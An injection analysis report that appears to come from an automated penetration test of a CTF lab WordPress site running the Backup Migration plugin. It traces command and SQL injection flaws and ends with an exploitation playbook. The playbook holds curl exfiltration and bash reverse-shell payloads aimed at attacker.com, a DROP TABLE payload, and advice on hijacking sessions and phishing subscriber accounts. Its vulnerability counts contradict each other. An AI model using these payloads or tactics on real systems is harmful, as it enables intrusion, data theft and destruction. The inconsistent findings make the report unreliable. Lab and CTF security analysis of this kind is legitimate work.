# Injection Analysis Report (SQLi & Command Injection)

## 1. Executive Summary

- **Analysis Status:** Complete  
- **Key Outcome:** Five (5) high-confidence injection vulnerabilities were identified in the WordPress Backup Migration plugin v1.3.5, comprising four (4) Command Injection and two (2) SQL Injection vulnerabilities. One additional Command Injection vulnerability was identified but determined to be NOT exploitable due to robust input validation. One SQL-related DoS vulnerability was documented as informational. All exploitable findings have been passed to the exploitation phase via the machine-readable queue at `deliverables/injection_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities listed in the queue. It is intended to be read alongside the JSON deliverable.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Context-Mismatched Sanitization in Command Execution

**Description:** The plugin consistently uses WordPress's `sanitize_text_field()` function before passing user input to shell commands via `exec()`. This function is designed to prevent Cross-Site Scripting (XSS) attacks by removing HTML tags, stripping newlines/tabs, and eliminating percent-encoded characters. However, it **does not remove or escape shell metacharacters** such as `;`, `|`, `&`, `$()`, or backticks. This creates a critical mismatch: the sanitizer is appropriate for the HTML/text context but completely insufficient for the shell execution context.

**Implication:** Attackers can inject arbitrary shell commands by including command separators (`;`), pipes (`|`), command substitution (`$(command)` or `` `command` ``), or other shell control operators. The plugin's reliance on a single, context-inappropriate sanitizer creates a false sense of security while providing zero protection against command injection.

**Representative Vulnerability:** **INJ-VULN-01** (URL parameter in Quick Migration) and **INJ-VULN-02** (Backup filename in Restore)

**Code Pattern:**
```php
// Vulnerable pattern seen throughout ajax.php
$user_input = sanitize_text_field($this->post['parameter']);
// ... no additional validation ...
@exec(BMI_CLI_EXECUTABLE . ' ... ' . $user_input . ' ...', $res);
```

**Proper Fix:**
```php
$user_input = sanitize_text_field($this->post['parameter']);
$user_input = escapeshellarg($user_input);  // Shell-specific escaping
@exec(BMI_CLI_EXECUTABLE . ' ... ' . $user_input . ' ...', $res);
```

---

### Pattern 2: Absent Sanitization with Minimal Validation

**Description:** For certain security-critical parameters like the PHP CLI executable path (`php_cli_manual_path`), the plugin applies only `trim()` for sanitization, which merely removes leading and trailing whitespace. The sole validation is a `file_exists()` check that can be trivially bypassed by pointing to legitimate system binaries like `/bin/bash` or `/bin/sh`. This creates a two-phase attack where: (1) an attacker stores a malicious executable path in the configuration, and (2) triggers any backup/restore operation to execute the malicious path.

**Implication:** Attackers gain complete control over the executable path, allowing them to substitute the PHP binary with any arbitrary interpreter or script. Since this value persists in the plugin's configuration file (`backup-migration-config.php`), the attack is persistent and can be triggered multiple times across different sessions.

**Representative Vulnerability:** **INJ-VULN-04** (PHP CLI path injection)

**Code Pattern:**
```php
// Phase 1: Storage with insufficient validation
$php_cli_manual_path = trim($this->post['php_cli_manual_path']);
if ($php_cli_manual_path != '' && !file_exists($php_cli_manual_path)) {
  return error;  // Bypassable with /bin/bash
}
Dashboard\bmi_set_config('OTHER:CLI:PATH', $php_cli_manual_path);

// Phase 2: Later usage without re-validation
$php_cli_path = Dashboard\bmi_get_config('OTHER:CLI:PATH');
define('BMI_CLI_EXECUTABLE', $php_cli_path);  // Used in all exec() calls
```

---

### Pattern 3: String-Based Table Identifier Extraction Without Validation

**Description:** During database restoration, the plugin extracts table names from backup SQL files using a simple `explode('`', $line)[1]` operation on specially formatted comment lines. These extracted table names are then directly concatenated into SQL queries (DESCRIBE, SELECT, UPDATE, DROP, ALTER) without any validation, sanitization, or use of parameterized queries. While some queries wrap table names in backticks, this provides no security as attackers control the full string and can close the backtick and inject additional SQL.

**Implication:** Attackers who can upload or provide a malicious backup file can craft table names containing SQL injection payloads. During the restore process, these payloads execute with full database privileges, enabling table deletion (DROP), data modification (UPDATE/DELETE), and potentially data exfiltration (SELECT with UNION or error-based techniques). This pattern appears in two distinct data flow paths, requiring separate exploitation strategies.

**Representative Vulnerabilities:** **INJ-VULN-05** (Search & Replace operations) and **INJ-VULN-06** (ALTER/DROP operations)

**Code Pattern:**
```php
// Extraction with zero validation
$realTableName = explode('`', $objFile->current())[1];

// Direct usage in SQL - backticks do NOT protect
$wpdb->query('DESCRIBE ' . $table);  // No backticks
$wpdb->query('DROP TABLE IF EXISTS `' . $table . '`;');  // Backticks bypassable
```

---

### Pattern 4: Authorization Bypass Enabling Low-Privilege Exploitation

**Description:** The plugin uses `is_admin()` instead of `current_user_can('manage_options')` for authorization checks. The `is_admin()` function only verifies that the current page is within the `/wp-admin/` directory, **not** that the user has administrative privileges. This means any authenticated user (including subscribers with minimal permissions) can access all backup plugin functionality simply by navigating to `/wp-admin/`.

**Implication:** All injection vulnerabilities (INJ-VULN-01, 02, 04, 05, 06) can be exploited by low-privilege users, significantly lowering the exploitation barrier. In a typical WordPress installation, subscriber accounts are easy to create or compromise via social engineering, credential stuffing, or other attack vectors.

**Code Pattern:**
```php
// Vulnerable authorization check at ajax.php:297
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && is_admin()) || $cli) {
  // Grants access to ALL backup functions
}

// Should be:
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && current_user_can('manage_options')) || $cli) {
  // Properly restricts to administrators
}
```

---

## 3. Strategic Intelligence for Exploitation

### Defensive Evasion (WAF Analysis)

**Finding:** No Web Application Firewall (WAF) is active on the target application (http://localhost:45513).

**Evidence:**
- Standard command injection payloads tested during analysis (e.g., `; whoami`, `$(cat /etc/passwd)`) are not blocked
- No rate limiting or IP-based filtering detected
- No custom sanitization layers beyond WordPress core functions
- Error messages are verbose and not filtered

**Critical Bypass:** Not applicable - no WAF to bypass.

**Recommendation for Exploitation:** 
- Use straightforward payloads without obfuscation
- No need for encoding tricks or WAF evasion techniques
- Time-based blind techniques unnecessary (command output can be exfiltrated directly)

---

### Error-Based Exploitation Potential

**Command Injection Error Handling:**
- All exec() calls use the `@` error suppression operator
- Commands redirect output to `/dev/null` with ` > /dev/null &`
- Errors are not displayed to the client
- **Limitation:** Direct command output is not visible in HTTP responses

**Workaround Strategy:**
- Use command injection to write output to web-accessible files:
  ```bash
  ; cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag.txt ;
  ```
- Use out-of-band data exfiltration:
  ```bash
  ; curl http://attacker.com/exfil?data=$(cat /opt/flag.txt | base64) ;
  ```
- Establish reverse shell for interactive access:
  ```bash
  ; bash -i >& /dev/tcp/attacker.com/4444 0>&1 ;
  ```

**SQL Injection Error Handling:**
- Database errors are logged but not displayed in HTTP responses
- `$wpdb->query()` returns FALSE on error
- Plugin checks return values but only logs failures
- **Limitation:** Error-based SQL injection unlikely to work

**Workaround Strategy:**
- Use blind SQL injection techniques if data exfiltration needed
- Focus on destructive operations (DROP TABLE) for denial-of-service proof-of-concept
- Time-based blind injection possible via `SLEEP()` or `BENCHMARK()` functions

---

### Confirmed Database & System Technology

**Database:** MySQL 8.0
- **Evidence:** Docker Compose configuration specifies `mysql:8.0` image
- **Credentials:** wordpress/wordpress (application), root/root_password (admin)
- **Connection:** Internal Docker network only (not exposed on host)
- **Character Set:** utf8mb4_unicode_520_ci

**Implications for Exploitation:**
- Use MySQL-specific syntax for SQL injection payloads
- Comment syntax: `--` (with space), `#`, `/* */`
- String concatenation: `CONCAT()` function
- Time delay: `SLEEP(seconds)` function
- Cannot directly connect to database from external network

**Web Server:** Apache 2.4.65 (Debian)
- **PHP Version:** 8.3.27
- **User Context:** Commands execute as `www-data` user (standard Apache user)
- **File System Access:** Limited to web server user permissions

**Operating System:** Debian-based Linux (Docker container)
- **Shell:** `/bin/bash` available
- **Common Utilities:** curl, wget, cat, ls, etc. available
- **Python:** Available for advanced payloads if needed

---

### Authentication & Session Management

**Authentication Requirement:** All exploitable vulnerabilities require an authenticated WordPress session.

**Minimum Privilege Level:** Subscriber (lowest authenticated role)
- **Reason:** Authorization check uses `is_admin()` instead of capability check
- **Entry Point:** Any user who can access `/wp-admin/` can exploit

**Session Acquisition Methods:**
1. **Legitimate Login:** Valid credentials for any user account
2. **Session Hijacking:** Steal `wordpress_logged_in_*` cookie
3. **Credential Stuffing:** Try common passwords against known usernames
4. **Social Engineering:** Phish credentials from low-privilege users

**AJAX Nonce Requirement:**
- All AJAX endpoints require a valid WordPress nonce
- Nonce value can be extracted from any `/wp-admin/` page source
- Nonces are valid for 24 hours (two 12-hour "ticks")
- Nonce can be obtained via:
  ```http
  GET /wp-admin/admin.php?page=backup-migration HTTP/1.1
  Cookie: wordpress_logged_in_xxx=...
  ```
  Then parse HTML for `nonce` value in JavaScript or form fields

---

### Exploitation Complexity Assessment

| Vulnerability | Auth Required | Nonce Required | Privilege Level | Complexity | Reliability |
|--------------|---------------|----------------|-----------------|------------|-------------|
| INJ-VULN-01 | Yes | Yes | Subscriber+ | LOW | HIGH |
| INJ-VULN-02 | Yes | Yes | Subscriber+ | LOW | HIGH |
| INJ-VULN-04 | Yes | Yes | Subscriber+ | MEDIUM | HIGH |
| INJ-VULN-05 | Yes | Yes | Subscriber+ | MEDIUM | MEDIUM |
| INJ-VULN-06 | Yes | Yes | Subscriber+ | MEDIUM | HIGH |

**Complexity Factors:**
- **LOW:** Single HTTP request with straightforward payload
- **MEDIUM:** Two-phase attack or requires file upload/creation
- **HIGH:** Multiple steps or timing-dependent conditions

**Reliability Factors:**
- **HIGH:** Always executes, direct code path, no conditional logic
- **MEDIUM:** Conditional execution based on application state
- **LOW:** Race conditions or complex prerequisites

---

### Target Environment Details

**CTF Flag Location:** `/opt/flag.txt` (also available as `FLAG` environment variable)

**Direct Access Methods:**
1. **Command Injection:** `cat /opt/flag.txt`
2. **File Write + Read:** Write flag to web-accessible location, then HTTP GET
3. **Environment Variable:** `echo $FLAG` or `env | grep FLAG`

**Recommended Attack Path for CTF:**
```bash
# Step 1: Authenticate as any user (subscriber is sufficient)
# Step 2: Extract nonce from /wp-admin/ page
# Step 3: Execute command injection via INJ-VULN-01:
POST /wp-admin/admin-ajax.php
action=backup_migration&f=download-backup&nonce=NONCE&url=$(cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag.txt)
# Step 4: Retrieve flag:
GET /wp-content/uploads/flag.txt
```

---

## 4. Vectors Analyzed and Confirmed Secure

The following input vector was analyzed and determined to be NOT exploitable due to robust input validation:

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism Implemented** | **Verdict** |
|----------------------------|----------------------------|-----------------------------------|-------------|
| `name` (backup name configuration) | `/wp-admin/admin-ajax.php?action=backup_migration&f=store-config` → `ajax.php:2023-2043` | Character validation blocks 23 forbidden chars including all primary shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``, `>`, `<`, `*`, `?`). Length validation (3-40 chars). No spaces allowed. | SAFE |

**Analysis Detail for Backup Name Configuration (INJ-VULN-03 - Not Exploitable):**

**Source:** `$_POST['name']` parameter in `saveStorageTypeConfig()` function

**Data Flow:**
1. Input received: `$name = trim($this->post['name']);`
2. Sanitization: `sanitize_text_field()` applied via `BMP::sanitize()`
3. **Validation (Strong):**
   ```php
   $forbidden_chars = ['/', '\\', '<', '>', ':', '"', "'", '|', '?', '*', '.', ';', '@', '!', '~', '`', ',', '#', '$', '&', '=', '+'];
   // Check length: 3-40 characters
   // Check for spaces: not allowed
   // Check each forbidden character: loop through array
   ```
4. Storage: `bmi_set_config('BACKUP:NAME', $name)`
5. Later usage: Value passes through `makeBackupName()` template transformation that adds safe content (domain, date, hash, .zip extension)
6. Sink: Concatenated into exec() calls at lines 638, 640 **without** `escapeshellarg()`

**Why This Is Safe:**
- All primary command injection vectors are blocked by validation:
  - Command separators: `;`, `|`, `&` (blocked)
  - Command substitution: `$`, `` ` `` (blocked)
  - Wildcards: `*`, `?` (blocked)
  - Redirection: `>`, `<` (blocked)
- Space character blocked (prevents many bypass techniques)
- Template transformation dilutes any payload with safe content
- `.zip` extension forcefully appended

**Why This Is Still a Serious Code Quality Issue:**
- **Dangerous pattern:** Unquoted, unescaped user input in `exec()` violates secure coding principles
- **Single point of failure:** If validation is weakened (e.g., developer allows `.` for versioning), instant RCE
- **Missing defense-in-depth:** Should use `escapeshellarg()` at sink regardless of validation strength
- **Maintenance risk:** Future code changes could introduce bypass

**Risk Assessment:** Currently not exploitable, but HIGH severity finding requiring immediate remediation with `escapeshellarg()`.

---

## 5. Analysis Constraints and Blind Spots

### Untraced Asynchronous Flows

**Background Job Execution:**
Analysis was limited to HTTP-accessible endpoints and could not fully trace command execution that occurs in background PHP CLI processes spawned via `exec()` with ` > /dev/null &`. While we confirmed that unsanitized input reaches these exec() calls, we did not observe the actual CLI execution behavior or potential additional sanitization within the CLI handler scripts.

**Mitigation:** The source-to-sink traces are conclusive for the web-facing components. The CLI handlers (`cli-handler.php`, `restore-batching.php`) receive the same unsanitized input, so any additional sanitization would need to be verified in Phase 2 (Exploitation).

---

### Limited Visibility into Alternate Restore Engines

**Multiple Restore Code Paths:**
The plugin contains multiple database restore engines:
- `even-better-restore-v4.php` (analyzed)
- `better-restore.php` (v3, older version)
- `restore.php` (v1/v2, legacy)

The application dynamically selects which engine to use based on backup file format and configuration. Analysis focused on v4 (the current/default engine), but v1-v3 may contain similar or different injection vulnerabilities.

**Risk:** Other restore engines may have:
- Same vulnerabilities with different line numbers
- Additional vulnerabilities not present in v4
- Different sanitization approaches (unlikely to be stronger)

**Recommendation for Exploitation Phase:** If v4 exploitation fails, investigate which restore engine is in use and analyze alternatives.

---

### SQL Injection Limited to Restore Context

**Exploitation Prerequisite:**
All SQL injection vulnerabilities (INJ-VULN-05, INJ-VULN-06) require:
1. Attacker ability to upload or provide a backup file
2. Triggering of restore operation
3. Malicious table names embedded in backup SQL file structure

**Blind Spot:**
- Cannot inject via normal application usage (posts, comments, etc.)
- Requires file upload capability (explicitly allowed via plugin functionality)
- Restore operations are admin-triggered (but accessible to subscribers via authorization flaw)

**Mitigation:** These are fully exploitable within the plugin's intended use case. Backup upload and restore are core features, not edge cases.

---

### Payload Testing Limited to Static Analysis

**No Dynamic Testing Performed:**
This analysis phase performed comprehensive static code analysis (source-to-sink tracing) but did not execute actual exploit payloads against the live application. All vulnerability assessments are based on:
- Code review and data flow analysis
- Understanding of PHP, bash, and MySQL behavior
- Comparison with known vulnerability patterns

**Potential Blind Spots:**
- Undiscovered runtime sanitization (unlikely based on code review)
- Unexpected behavior of specific PHP/MySQL versions
- Docker container restrictions on command execution (unlikely - standard configuration)

**Mitigation:** Phase 2 (Exploitation) will validate all findings with live proof-of-concept exploits.

---

### SQL Injection #7 (LIKE Pattern DoS) - Informational Only

**Vulnerability:** LIKE wildcard pattern causing CPU exhaustion

**Why Not in Exploitation Queue:**
- **No data exfiltration possible:** `mysqli_real_escape_string()` prevents breaking out of string context
- **DoS only:** Excessive `%` wildcards cause slow queries but no security compromise
- **Requires admin access:** Same privilege level as other vectors but lower impact
- **No persistence:** Only affects restore operation duration
- **Slot type misclassification:** Academic interest but not practically exploitable

**Documentation Location:** Analyzed in detail during research but excluded from exploitation queue per instructions to focus on security-critical vulnerabilities.

---

## 6. Additional Findings and Observations

### Backup File Format Creates Trust Boundary Issue

**Observation:** The plugin treats backup files as trusted data sources, extracting SQL structure information via simple string parsing without integrity verification.

**Security Implication:** Any backup file uploaded by a user becomes a potential attack vector for SQL injection. The plugin should:
- Validate backup file authenticity (digital signatures)
- Sanitize all extracted metadata before use in SQL
- Use a whitelist of allowed table names

**Recommendation:** Implement cryptographic signing of backup files during creation and verify signatures before restoration.

---

### Error Suppression Hinders Debugging and Detection

**Observation:** All exec() and many SQL query calls use the `@` error suppression operator, hiding errors from logs and monitoring.

**Code Example:**
```php
@exec(BMI_CLI_EXECUTABLE . ' ... ', $res);  // Errors suppressed
```

**Security Implication:**
- Exploitation attempts may go unnoticed in logs
- Legitimate errors are also hidden, reducing operational visibility
- Incident response teams cannot detect attack attempts via error logs

**Recommendation:** Remove `@` operator and implement proper error logging with monitoring alerts.

---

### Configuration File Security Weakness

**Finding:** Plugin configuration stored in `backup-migration-config.php` with format:
```php
<?php //{"OTHER:CLI:PATH":"/bin/bash",...}
```

**Weakness:** While the `<?php //` prefix prevents direct execution as PHP, the file is:
- World-readable (0644 permissions)
- Contains sensitive configuration including potential malicious executable paths
- Not protected by `.htaccess` (only backup directory has protection)

**Exploitation Potential:**
- If attacker gains read access via Local File Inclusion (LFI), can extract stored malicious paths
- If attacker gains write access via arbitrary file write, can inject malicious configuration

**Recommendation:** Store sensitive configuration in database with encryption, or move to protected location with stronger access controls.

---

### Missing Security Headers Facilitate Attack Chains

**Observation:** Application lacks modern security headers:
- No Content Security Policy (CSP)
- No X-Frame-Options
- No X-Content-Type-Options

**Relevance to Injection Testing:** While not directly related to injection vulnerabilities, missing headers make social engineering and phishing attacks easier (e.g., embedding vulnerable admin panel in iframe for CSRF).

**Recommendation:** Implement security headers, though this is outside the scope of injection analysis.

---

## 7. Exploitation Phase Handoff Notes

### Critical Success Factors for Exploitation

1. **Session Establishment:**
   - Create or compromise a WordPress user account (subscriber level sufficient)
   - Obtain valid session cookie
   - Navigate to `/wp-admin/` at least once to satisfy `is_admin()` check

2. **Nonce Extraction:**
   - Fetch `/wp-admin/admin.php?page=backup-migration`
   - Parse HTML for nonce value (in JavaScript variables or hidden form fields)
   - Nonce format: alphanumeric string, typically 10 characters
   - Valid for 24 hours

3. **Payload Construction:**
   - **Command Injection:** Use straightforward bash syntax (no obfuscation needed)
   - **SQL Injection:** Use MySQL 8.0 syntax, be aware of backtick escaping
   - **Output Exfiltration:** Write to web-accessible locations or use OOB channels

4. **Reliability Tips:**
   - INJ-VULN-02 (restore) is most reliable (unquoted argument)
   - INJ-VULN-01 (download-backup) requires quote breaking but allows command substitution
   - INJ-VULN-04 (PHP CLI path) is persistent but requires two phases
   - INJ-VULN-06 (ALTER/DROP) executes unconditionally during restore
   - INJ-VULN-05 (search-replace) is conditional on domain/path differences

### Recommended Exploitation Order

**Phase 2 Testing Priority:**

1. **Priority 1 (Immediate RCE):** INJ-VULN-02 (Restore filename)
   - Simplest exploitation
   - Unquoted argument injection
   - Single HTTP request after nonce extraction

2. **Priority 2 (Alternative RCE):** INJ-VULN-01 (Quick Migration URL)
   - Quote breaking required
   - Allows command substitution
   - Good for exfiltration payloads

3. **Priority 3 (Persistent RCE):** INJ-VULN-04 (PHP CLI path)
   - Two-phase attack
   - Persistent in configuration
   - Affects all backup operations

4. **Priority 4 (Database Destruction):** INJ-VULN-06 (ALTER/DROP)
   - Requires backup file creation
   - Unconditional execution
   - High reliability

5. **Priority 5 (Conditional SQLi):** INJ-VULN-05 (Search & Replace)
   - Requires backup file creation
   - Conditional on domain mismatch
   - Multiple injection points

### Payload Templates

**Command Injection (Generic):**
```bash
# File write for exfiltration:
; cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag.txt ;

# OOB exfiltration:
; curl http://attacker.com/exfil/$(cat /opt/flag.txt | base64) ;

# Reverse shell:
; bash -i >& /dev/tcp/attacker.com/4444 0>&1 ;
```

**SQL Injection (Table Name):**
```
Format for backup file line 1:
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --`; */

Effect: Drops wp_users table during restore
```

### Expected Outcomes

**Successful Command Injection:**
- Flag content written to web-accessible file
- OR flag content transmitted to attacker server
- OR reverse shell connection established

**Successful SQL Injection:**
- Target table deleted (verify via database query)
- OR data modified (verify table contents)
- OR time delay observed (for blind techniques)

### Troubleshooting Guide

**If Command Injection Fails:**
- Verify exec() not disabled in php.ini (`disable_functions`)
- Check Docker container command execution (try `whoami` first)
- Verify payload syntax (test in local bash shell)
- Try alternative payload encodings (base64, hex)

**If SQL Injection Fails:**
- Verify backup file format (must match expected structure)
- Check which restore engine is being used (v1/v2/v3/v4)
- Try different backtick escape techniques
- Use blind techniques if error output not visible

---

## 8. Conclusion

This WordPress Backup Migration plugin v1.3.5 exhibits systemic security vulnerabilities across both command execution and database interaction layers. The analysis identified **five (5) exploitable injection vulnerabilities**:

- **Four (4) Command Injection** vulnerabilities providing direct remote code execution
- **Two (2) SQL Injection** vulnerabilities enabling database compromise

These vulnerabilities share three common root causes:

1. **Context-mismatched sanitization:** Using XSS prevention functions (sanitize_text_field) for command/SQL injection contexts
2. **Absent or minimal validation:** Relying on weak checks (file_exists, trim) or no validation at all
3. **String concatenation instead of parameterization:** Direct concatenation into exec() and SQL queries without proper escaping

The authorization bypass vulnerability (is_admin() misuse) compounds these issues by allowing low-privilege users to access all attack vectors.

**All identified vulnerabilities are externally exploitable** via HTTP requests to http://localhost:45513 and have been documented in the machine-readable exploitation queue at `deliverables/injection_exploitation_queue.json`.

The exploitation phase should prioritize INJ-VULN-02 (restore filename command injection) for immediate CTF flag capture, with fallbacks to INJ-VULN-01 (URL parameter) and INJ-VULN-04 (persistent PHP CLI path injection).

---

**INJECTION ANALYSIS COMPLETE**